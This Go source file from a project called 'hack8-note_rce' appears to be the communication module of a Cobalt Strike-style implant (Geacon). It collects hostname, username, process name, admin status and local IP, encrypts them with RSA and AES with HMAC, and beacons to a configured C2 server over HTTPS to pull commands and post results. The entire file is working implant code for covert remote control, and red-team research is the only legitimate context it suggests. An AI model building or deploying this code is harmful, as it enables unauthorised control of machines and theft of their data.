package packet

import (
	"bytes"
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"hack8-note_rce/Util"
	"hack8-note_rce/config"
	"hack8-note_rce/crypt"
	"hack8-note_rce/sysinfo"
	"strconv"
	"strings"
	"time"
)

var (
	encryptedMetaInfo string
	clientID          int
)

func WritePacketLen(b []byte) []byte {
	length := len(b)
	return WriteInt(length)
}

func WriteInt(nInt int) []byte {
	bBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(bBytes, uint32(nInt))
	return bBytes
}

func ReadInt(b []byte) uint32 {
	return binary.BigEndian.Uint32(b)
}

func ReadShort(b []byte) uint16 {
	return binary.BigEndian.Uint16(b)
}

// 解密server返回的数据包
func DecryptPacket(b []byte) ([]byte, error) {
	decrypted, err := crypt.AesCBCDecrypt(b, config.AesKey)
	if err != nil {
		return nil, err
	}
	return decrypted, nil
}

func EncryptPacket() {

}

func ParsePacket(buf *bytes.Buffer, totalLen *uint32) (uint32, []byte, error) {
	commandTypeBytes := make([]byte, 4)
	_, err := buf.Read(commandTypeBytes)
	if err != nil {
		return 0, nil, err
	}
	commandType := binary.BigEndian.Uint32(commandTypeBytes)
	commandLenBytes := make([]byte, 4)
	_, err = buf.Read(commandLenBytes)
	if err != nil {
		return 0, nil, err
	}
	commandLen := ReadInt(commandLenBytes)
	commandBuf := make([]byte, commandLen)
	_, err = buf.Read(commandBuf)
	if err != nil {
		return 0, nil, err
	}
	*totalLen = *totalLen - (4 + 4 + commandLen)
	return commandType, commandBuf, nil

}

func MakePacket(replyType int, b []byte) []byte {
	config.Counter += 1
	buf := new(bytes.Buffer)
	counterBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(counterBytes, uint32(config.Counter))
	buf.Write(counterBytes)

	if b != nil {
		resultLenBytes := make([]byte, 4)
		resultLen := len(b) + 4
		binary.BigEndian.PutUint32(resultLenBytes, uint32(resultLen))
		buf.Write(resultLenBytes)
	}

	replyTypeBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(replyTypeBytes, uint32(replyType))
	buf.Write(replyTypeBytes)

	buf.Write(b)

	encrypted, err := crypt.AesCBCEncrypt(buf.Bytes(), config.AesKey)
	if err != nil {
		return nil
	}
	// cut the zero because Golang's AES encrypt func will padding IV(block size in this situation is 16 bytes) before the cipher
	encrypted = encrypted[16:]

	buf.Reset()

	sendLen := len(encrypted) + crypt.HmacHashLen
	sendLenBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(sendLenBytes, uint32(sendLen))
	buf.Write(sendLenBytes)
	buf.Write(encrypted)
	hmacHashBytes := crypt.HmacHash(encrypted)
	buf.Write(hmacHashBytes)

	return buf.Bytes()

}

// 加密本机系统信息
func EncryptedMetaInfo() (string, error) {
	packetUnencrypted := MakeMetaInfo()
	packetEncrypted, err := crypt.RsaEncrypt(packetUnencrypted)
	if err != nil {
		return "", err
	}

	finalPakcet := base64.StdEncoding.EncodeToString(packetEncrypted)
	return finalPakcet, nil
}

/*
MetaData for 4.1

	Key(16) | Charset1(2) | Charset2(2) |
	ID(4) | PID(4) | Port(2) | Flag(1) | Ver1(1) | Ver2(1) | Build(2) | PTR(4) | PTR_GMH(4) | PTR_GPA(4) |  internal IP(4 LittleEndian) |
	InfoString(from 51 to all, split with \t) = Computer\tUser\tProcess(if isSSH() this will be SSHVer)
*/
//获取本机信息，然后AES加密
func MakeMetaInfo() []byte {
	crypt.RandomAESKey()
	sha256hash := sha256.Sum256(config.GlobalKey)
	config.AesKey = sha256hash[:16]
	config.HmacKey = sha256hash[16:]

	clientID = sysinfo.GeaconID()
	processID := sysinfo.GetPID()
	//for link SSH, will not be implemented
	sshPort := 0
	/* for is X64 OS, is X64 Process, is ADMIN
	METADATA_FLAG_NOTHING = 1;
	METADATA_FLAG_X64_AGENT = 2;
	METADATA_FLAG_X64_SYSTEM = 4;
	METADATA_FLAG_ADMIN = 8;
	*/
	metadataFlag := sysinfo.GetMetaDataFlag()
	//for OS Version
	osVersion, _ := sysinfo.GetOSVersion()
	osVerSlice := strings.Split(osVersion, ".")
	osMajorVerison := 0
	osMinorVersion := 0
	osBuild := 0
	if len(osVerSlice) == 3 {
		osMajorVerison, _ = strconv.Atoi(osVerSlice[0])
		osMinorVersion, _ = strconv.Atoi(osVerSlice[1])
		osBuild, _ = strconv.Atoi(osVerSlice[2])
	} else if len(osVerSlice) == 2 {
		osMajorVerison, _ = strconv.Atoi(osVerSlice[0])
		osMinorVersion, _ = strconv.Atoi(osVerSlice[1])
	}

	//for Smart Inject, will not be implemented
	ptrFuncAddr := 0
	ptrGMHFuncAddr := 0
	ptrGPAFuncAddr := 0

	processName := sysinfo.GetProcessName()
	localIP := sysinfo.GetLocalIPInt()
	hostName := sysinfo.GetComputerName()
	currentUser, _ := sysinfo.GetUsername()

	localeANSI, _ := sysinfo.GetCodePageANSI()
	localeOEM, _ := sysinfo.GetCodePageOEM()

	clientIDBytes := make([]byte, 4)
	processIDBytes := make([]byte, 4)
	sshPortBytes := make([]byte, 2)
	flagBytes := make([]byte, 1)
	majorVerBytes := make([]byte, 1)
	minorVerBytes := make([]byte, 1)
	buildBytes := make([]byte, 2)
	ptrBytes := make([]byte, 4)
	ptrGMHBytes := make([]byte, 4)
	ptrGPABytes := make([]byte, 4)
	localIPBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(clientIDBytes, uint32(clientID))
	binary.BigEndian.PutUint32(processIDBytes, uint32(processID))
	binary.BigEndian.PutUint16(sshPortBytes, uint16(sshPort))
	flagBytes[0] = byte(metadataFlag)
	majorVerBytes[0] = byte(osMajorVerison)
	minorVerBytes[0] = byte(osMinorVersion)
	binary.BigEndian.PutUint16(buildBytes, uint16(osBuild))
	binary.BigEndian.PutUint32(ptrBytes, uint32(ptrFuncAddr))
	binary.BigEndian.PutUint32(ptrGMHBytes, uint32(ptrGMHFuncAddr))
	binary.BigEndian.PutUint32(ptrGPABytes, uint32(ptrGPAFuncAddr))
	binary.BigEndian.PutUint32(localIPBytes, uint32(localIP))

	osInfo := fmt.Sprintf("%s\t%s\t%s", hostName, currentUser, processName)
	osInfoBytes := []byte(osInfo)

	fmt.Printf("clientID: %d\n", clientID)
	onlineInfoBytes := Util.BytesCombine(clientIDBytes, processIDBytes, sshPortBytes,
		flagBytes, majorVerBytes, minorVerBytes, buildBytes, ptrBytes, ptrGMHBytes, ptrGPABytes, localIPBytes, osInfoBytes)

	metaInfo := Util.BytesCombine(config.GlobalKey, localeANSI, localeOEM, onlineInfoBytes)
	magicNum := sysinfo.GetMagicHead()
	metaLen := WritePacketLen(metaInfo)
	packetToEncrypt := Util.BytesCombine(magicNum, metaLen, metaInfo)

	return packetToEncrypt
}

//初始化AES密钥，并判断是否存活

func FirstBlood() bool {
	//初始化密钥
	encryptedMetaInfo, _ = EncryptedMetaInfo()
	for {
		geturi := Util.RandString(config.Http_get_uri)

		GetUrl := "https://" + config.C2 + geturi

		data, err := HttpGet(GetUrl, encryptedMetaInfo, config.Http_get_metadata_crypt)
		if err == nil {
			fmt.Println("firstblood: " + string(data))
			break
		} else {
			fmt.Println("firstblood error: " + err.Error())
		}
		time.Sleep(500 * time.Millisecond)
	}
	time.Sleep(config.WaitTime)
	return true
}

func PullCommand() ([]byte, error) {
	geturi := Util.RandString(config.Http_get_uri)

	GetUrl := "https://" + config.C2 + geturi

	data, err := HttpGet(GetUrl, encryptedMetaInfo, config.Http_get_output_crypt)
	fmt.Println("pullcommand success")
	if err != nil {
		return nil, err
	}
	return data, err
}

func PushResult(b []byte) ([]byte, error) {
	id, _ := crypt.EncryptMultipleTypes([]byte(strconv.Itoa(clientID)), config.Http_post_id_crypt)
	//更换随机URL
	posturi := Util.RandString(config.Http_post_uri)

	url := "https://" + config.C2 + posturi + "?" + config.Http_post_id_header + "=" + string(id)
	println(url)
	data, err := HttpPost(url, b, config.Http_post_server_output_crypt)
	fmt.Println("pushresult success")
	if err != nil {
		return nil, err
	}
	return data, err
}

func ErrorProcess(err error) {
	errIdBytes := WriteInt(0) // must be zero
	arg1Bytes := WriteInt(0)  // for debug
	arg2Bytes := WriteInt(0)
	errMsgBytes := []byte(err.Error())
	result := Util.BytesCombine(errIdBytes, arg1Bytes, arg2Bytes, errMsgBytes)
	finalPaket := MakePacket(31, result)
	PushResult(finalPaket)
}

/*
func processError(err string) {
	errIdBytes := WriteInt(0) // must be zero
	arg1Bytes := WriteInt(0)  // for debug
	arg2Bytes := WriteInt(0)
	errMsgBytes := []byte(err)
	result := util.BytesCombine(errIdBytes, arg1Bytes, arg2Bytes, errMsgBytes)
	finalPaket := MakePacket(31, result)
	PushResult(finalPaket)
}
*/
